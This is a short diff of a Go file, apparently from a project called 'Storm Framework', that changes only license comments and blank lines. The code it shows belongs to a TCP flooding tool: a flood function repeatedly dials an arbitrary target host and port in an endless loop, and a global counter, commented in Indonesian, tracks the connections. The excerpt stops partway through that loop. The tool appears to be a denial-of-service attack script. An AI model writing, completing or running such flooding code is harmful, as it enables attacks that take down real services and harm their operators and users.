@@ -1,10 +1,9 @@
+// MIT License.
 // Copyright (c) 2026 Storm Framework
-// Licensed under the MIT License.
 
-See LICENSE file in the project root for full license information.
+// See LICENSE file in the project root for full license information.
 
 package main
-
 import (
 	"flag"
 	"fmt"
@@ -13,13 +12,10 @@ import (
 	"sync/atomic" // Untuk hitungan real-time yang akurat
 	"time"
 )
-
 var count uint64 // Counter global
-
 func flood(target string, port int, wg *sync.WaitGroup) {
 	defer wg.Done()
 	address := fmt.Sprintf("%s:%d", target, port)
-
 	for {
 		conn, err := net.DialTimeout("tcp", address, 2*time.Second)
 		if err != nil {
